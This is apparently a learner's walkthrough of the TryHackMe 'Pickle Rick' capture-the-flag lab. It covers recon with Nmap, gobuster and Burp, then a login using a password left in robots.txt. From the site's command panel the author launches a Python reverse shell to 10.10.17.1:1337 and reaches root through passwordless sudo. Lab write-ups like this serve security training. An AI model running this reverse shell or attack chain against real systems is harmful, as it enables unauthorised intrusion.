# rickMortyCTF_THM [Pickle Rick]

## Inital Recon


- An IP was given to us. When we visit “[http://10.201.15.**/](http://10.201.15.57/)”. [Change the IP according to what was given to you]. We land on a page.

![image.png](rickMortyCTF_THM%202593c5d54c7680619bf4df15500d0d7f/image.png)

- Thoughts →
    - There is a single picture in the website which we can further analyze.
    - Reading the text, we get the hint that we have to run the request for this web page through burp.
    - There might be some kind of brute force login.
- I did not find anything unusual so decided to check the /robots.txt once.
- In /robots.txt , we get
    
    ```python
    Wubbalubbadubdub
    ```
    
- Let’s brute force the directory in the meantime while checking the burp suite response and request.
- Burp Request we got
    
    ```python
    GET / HTTP/1.1
    Host: 10.201.15.57
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    If-Modified-Since: Sun, 10 Feb 2019 16:37:33 GMT
    If-None-Match: "426-5818ccf125686-gzip"
    Priority: u=0, i
    ```
    
- Checking the response
    
    ![VirtualBoxVM_I80C7bvvMH.png](rickMortyCTF_THM%202593c5d54c7680619bf4df15500d0d7f/VirtualBoxVM_I80C7bvvMH.png)
    
    - Found this in the response.
    - You could have also gotten this in simple inspection.
    - But I found it like this.
- Now we do a Nmap scan on the target and get
    
    ```python
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 95:3e:91:e0:7b:06:9c:da:64:e3:3f:65:58:c8:31:d3 (RSA)
    |   256 77:40:81:69:4f:2f:fd:df:64:f4:66:12:e4:4c:69:f4 (ECDSA)
    |_  256 9b:b9:4a:4a:85:57:eb:b1:a8:5d:6b:50:24:05:bf:71 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Rick is sup4r cool
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
    - This suggests that there is an open ssh connection which we may try to exploit or brute force as suggested earlier.
    - After checking, I found that there was no exploit found in that.
- Directory bruteforcing the url we get,
    
    ```python
    gobuster dir -u http://10.201.15.57 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30
    ```
    
    ![VirtualBoxVM_3S0dAESWnK.png](rickMortyCTF_THM%202593c5d54c7680619bf4df15500d0d7f/VirtualBoxVM_3S0dAESWnK.png)
    
    ![VirtualBoxVM_zb0U5cdMUW.png](rickMortyCTF_THM%202593c5d54c7680619bf4df15500d0d7f/VirtualBoxVM_zb0U5cdMUW.png)
    

## Exploiting

- Till this point we have the username and the probable password “Wubbalubbadubdub”.
- Testing out them at /login.php they work..
- I get a commands tab where i can input commands
    - When i input “ls” command it works fine but it does not work “cat Sup….txt”. It says command execution disabled. Hence, we might have to use a reverse shell here.
- Then i check if python is present , It returned no result
- I check the same for python3 and it gives a version output
- Using the python reverse shell, i create a reverse shell
- Reverse shell used 

    ```python
    python3 -c 'import socket,subprocess,os;
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        s.connect(("10.10.17.1",1337));
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
        p=subprocess.call(["/bin/sh","-i"]);'
    ```

- In the reverse shell, I first upgrade the shell using the command
    
    ```python
    /usr/bin/script -qc /bin/bash /dev/null
    export TERM=xterm #to change the terminal emulator
    ```
    
- This basically creates a new upgraded shell
- The First ingredient can be found in the “Sup3rS3cretPickl3Ingred.txt”
    - mr. me**{redacted}
- Using the clue, the other ingredient can be found in folders of user “rick”
    - 1 jer***{redacted}
- For the third ingredient we have to do privelege escalation.
- Running the command sudo -l to list priveleges
- We see that there is “no passwd”.
- So, doing “sudo su”, we escalate our priveleges, get into the root directory and get the last ingredient
    - flee****{redacted}